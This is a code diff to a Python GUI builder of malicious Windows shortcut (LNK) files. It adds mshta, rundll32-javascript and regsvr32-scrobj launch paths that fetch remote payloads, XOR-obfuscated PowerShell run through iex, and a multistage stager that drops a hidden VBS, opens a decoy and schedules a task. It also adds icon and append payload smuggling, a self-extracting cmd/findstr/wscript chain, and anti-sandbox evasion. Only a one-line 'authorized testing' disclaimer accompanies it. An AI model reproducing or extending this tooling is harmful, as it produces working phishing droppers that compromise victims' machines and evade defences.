+        # --- Standard embedded payload (Base64) ---
         else:
-            # Original embedded payload (full self‑contained)
             encoded_b64 = base64.b64encode(script_bytes).decode('ascii')
-            if key_bytes:
+            if self.xor_cb.isChecked():
                 key_b64 = base64.b64encode(key_bytes).decode('ascii')
                 xor_decoder = f"$k=[Convert]::FromBase64String('{key_b64}');$d=[Convert]::FromBase64String($d);for($i=0;$i -lt $d.Length;$i++){{$d[$i]=$d[$i] -bxor $k[$i % $k.Length]}};$d=[System.Text.Encoding]::{encoding_name}.GetString($d)"
                 ps_command = f"$d='{encoded_b64}';{xor_decoder}|iex"
@@ -1607,7 +1744,7 @@ d $MyInvocation.MyCommand.Path {payload_len} @({key_array})
             self.import_input.setText(final_arg)
             self.preview_label.setText(f"Arguments: {final_arg[:100]}...")
             self.appended_payload_bytes = None
-            self.log(f"[OK] Embedded payload generated ({len(encoded_b64)} chars base64, XOR: {self.xor_cb.isChecked()})")
+            self.log(f"[OK] Embedded payload generated ({len(encoded_b64)} chars base64)")
             self.mode_indicator.setText("Current Mode: Embedded Payload (No Network)")
 
         self.mode_indicator.setStyleSheet("color: #00FF00; font-weight: bold;")
@@ -1626,7 +1763,6 @@ d $MyInvocation.MyCommand.Path {payload_len} @({key_array})
         QApplication.processEvents()
 
     def _build_multistage_ps(self):
-        """Build the PowerShell stager that drops VBS, opens decoy, and schedules task."""
         decoy = self.decoy_url.text().strip()
         payload = self.payload_url.text().strip()
         folder_name = f"MicrosoftEdge_{random.randint(10000,99999)}"
@@ -1650,6 +1786,19 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
 
     def generate_lnk(self):
         try:
+            # Initialize all variables with default values
+            target_path = ""
+            arguments = ""
+            working_dir = None
+            use_proxy = False
+            spoof_target = None
+            regsvr32_unc = None
+            mshta_url = None
+            rundll32_js = None
+            multistage = False
+            appended_payload = None
+            icon_payload = None
+
             if self.raw_mode_cb.isChecked():
                 target_path = self.raw_target_path.text().strip()
                 if not target_path:
@@ -1667,20 +1816,13 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                     if reply == QMessageBox.StandardButton.No:
                         return
                 self.log(f"Raw Target Mode: {target_path} {arguments}")
-                use_proxy = False
-                spoof_target = None
-                regsvr32_unc = None
-                multistage = False
-                appended_payload = None   # Not applicable
 
             else:
-                # Check if multi-stage stager is enabled
                 if self.multistage_cb.isChecked():
                     if not self.decoy_url.text().strip() or not self.payload_url.text().strip():
                         QMessageBox.warning(self, "Warning", "Multi-Stage Stager requires Decoy URL and Payload URL.")
                         return
                     ps_stager = self._build_multistage_ps()
-                    # Encode the stager
                     encoded = base64.b64encode(ps_stager.encode('utf-16le')).decode()
                     arg = f"-E {encoded}"
                     target_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
@@ -1688,26 +1830,67 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                     working_dir = None
                     use_proxy = self.proxy_cb.isChecked()
                     spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
-                    regsvr32_unc = self.regsvr_url.text().strip() if self.regsvr_cb.isChecked() else None
                     multistage = True
-                    appended_payload = None
                 else:
-                    if not self.regsvr_cb.isChecked():
+                    if self.mshta_cb.isChecked():
+                        mshta_url = self.mshta_url.text().strip()
+                        if not mshta_url:
+                            QMessageBox.warning(self, "Warning", "mshta.exe URL required.")
+                            return
+                        target_path = r"C:\Windows\System32\mshta.exe"
+                        arguments = f'"{mshta_url}"'
+                        working_dir = None
+                    elif self.rundll_cb.isChecked():
+                        rundll32_js = self.rundll_js.text().strip()
+                        if not rundll32_js:
+                            QMessageBox.warning(self, "Warning", "JavaScript payload required.")
+                            return
+                        target_path = r"C:\Windows\System32\rundll32.exe"
+                        arguments = f'javascript:"\\..\\mshtml,RunHTMLApplication";{rundll32_js}'
+                        working_dir = None
+                    elif self.regsvr_cb.isChecked():
+                        regsvr32_unc = self.regsvr_url.text().strip()
+                        if not regsvr32_unc:
+                            QMessageBox.warning(self, "Warning", "regsvr32 URL required.")
+                            return
+                        target_path = r"C:\Windows\System32\regsvr32.exe"
+                        arguments = f'/s /n /i:"{regsvr32_unc}" scrobj.dll'
+                        working_dir = None
+                    elif self.binary_smuggle_cb.isChecked():
+                        target_path = r"C:\Windows\System32\wscript.exe"
+                        arguments = "//B"
+                        working_dir = None
+                        appended_payload = getattr(self, 'appended_payload_bytes', None)
+                    elif self.true_icon_cb.isChecked():
+                        target_path = r"C:\Windows\System32\notepad.exe"
+                        arguments = ""
+                        working_dir = None
+                        icon_payload = getattr(self, 'appended_payload_bytes', None)
+                        if icon_payload and len(icon_payload) > 500:
+                            QMessageBox.warning(self, "Payload Too Large",
+                                "True Icon Smuggling can only store up to ~500 bytes.\n"
+                                "Reduce script size or use a smaller XOR key."
+                            )
+                            return
+                        appended_payload = None
+                    elif self.self_extract_cb.isChecked():
+                        target_path = r"C:\Windows\System32\cmd.exe"
+                        arguments = '/c findstr /v "^-----" "%~f0" > "%TEMP%\\e.vbs" & wscript //B "%TEMP%\\e.vbs"'
+                        working_dir = None
+                        appended_payload = getattr(self, 'appended_payload_bytes', None)
+                    else:
                         arg = self.import_input.text().strip() or self.arg_display.toPlainText().strip()
                         if not arg:
-                            QMessageBox.warning(self, "Warning", "No -E argument set (or import one first).")
+                            QMessageBox.warning(self, "Warning", "No argument set (import or generate first).")
                             return
-                    else:
-                        arg = ""
-                    target_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
-                    arguments = arg
-                    working_dir = None
-                    use_proxy = self.proxy_cb.isChecked()
-                    spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
-                    regsvr32_unc = self.regsvr_url.text().strip() if self.regsvr_cb.isChecked() else None
-                    multistage = False
-                    appended_payload = getattr(self, 'appended_payload_bytes', None)
+                        target_path = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+                        arguments = arg
+                        working_dir = None
+                        use_proxy = self.proxy_cb.isChecked()
+                        spoof_target = self.stomp_path.text().strip() if self.stomp_cb.isChecked() else None
+                        appended_payload = getattr(self, 'appended_payload_bytes', None)
 
+            # Common LNK parameters
             icon = self.icon_combo.currentText()
             icon_path, icon_idx, ext = self.ICON_DATABASE[icon]
             name = self.filename_input.text().strip() or "Document"
@@ -1724,15 +1907,26 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
             if not save_path:
                 return
 
-            if not self.raw_mode_cb.isChecked():
+            # If True Icon Smuggling, also save the extractor VBS
+            if self.true_icon_cb.isChecked():
+                extractor_path = os.path.splitext(save_path)[0] + "_extractor.vbs"
+                encoding_choice = self.encoding_combo.currentText()
+                enc_name = "Unicode" if "UTF-16LE" in encoding_choice else "UTF8"
+                key_bytes = self._xor_encode(b'\x00', b'\x00') if not self.xor_cb.isChecked() else key_bytes
+                vbs_content = self._generate_extractor_vbs(os.path.basename(save_path), key_bytes, enc_name)
+                with open(extractor_path, 'w', encoding='utf-8') as f:
+                    f.write(vbs_content)
+                self.log(f"[OK] Extractor VBS saved: {os.path.basename(extractor_path)}")
+
+            if not self.raw_mode_cb.isChecked() and not self.mshta_cb.isChecked() and not self.rundll_cb.isChecked() and not self.regsvr_cb.isChecked():
                 stealth = self.stealth_combo.currentIndex()
                 hide = self.hide_pwsh_cb.isChecked()
                 mode = ["Download & Open", "Memory Execute", "Ultra Stealth"][self.type_combo.currentIndex()]
-                self.log(f"Generating LNK (PowerShell) - Mode: {mode}, Stealth: {['Normal','Moderate','Maximum'][stealth]}, Hide: {hide}, Proxy: {use_proxy}, Stomp: {bool(spoof_target)}, regsvr32: {bool(regsvr32_unc)}, MultiStage: {multistage}, Append: {bool(appended_payload)}")
+                self.log(f"Generating LNK (PowerShell) - Mode: {mode}, Stealth: {['Normal','Moderate','Maximum'][stealth]}, Hide: {hide}, Proxy: {use_proxy}, Stomp: {bool(spoof_target)}, Append: {bool(appended_payload)}")
             else:
                 stealth = 0
                 hide = False
-                self.log(f"Generating LNK (Raw Target) - Target: {target_path}")
+                self.log(f"Generating LNK (Proxy/Icon Smuggling/Self-Extract) - Target: {target_path}")
 
             LNKEngine.create_lnk(
                 save_path,
@@ -1747,7 +1941,10 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
                 use_proxy=use_proxy,
                 spoof_target_path=spoof_target,
                 regsvr32_unc=regsvr32_unc,
-                appended_payload=appended_payload   # NEW: pass appended payload
+                mshta_url=mshta_url if self.mshta_cb.isChecked() else None,
+                rundll32_js=rundll32_js if self.rundll_cb.isChecked() else None,
+                appended_payload=appended_payload,
+                icon_payload=icon_payload
             )
 
             size = os.path.getsize(save_path)
@@ -1813,9 +2010,11 @@ Start-Process -FilePath "$f\\update.vbs" -WindowStyle Hidden;
             "> 3 stealth levels<br>"
             "> Hidden PowerShell Window option<br>"
             "> Raw Target Mode<br>"
-            "> Advanced Evasion: conhost proxy, LNK Stomping, regsvr32 fileless<br>"
-            "> Multi-Stage Stager<br>"
-            "> Embedded Payload with XOR, String Obfuscation & Append Mode (Ultra Evasion)<br><br>"
+            "> Advanced Evasion: conhost, mshta, rundll32, regsvr32 proxies<br>"
+            "> Multi-Stage Stager (VBS + Scheduled Task)<br>"
+            "> Embedded Payload with XOR, String Obfuscation, Append, Binary & True Icon Smuggling<br>"
+            "> Self-Extracting LNK (cmd + findstr + wscript)<br>"
+            "> Anti-Sandbox Checks<br><br>"
             "For authorized testing only")
 
 
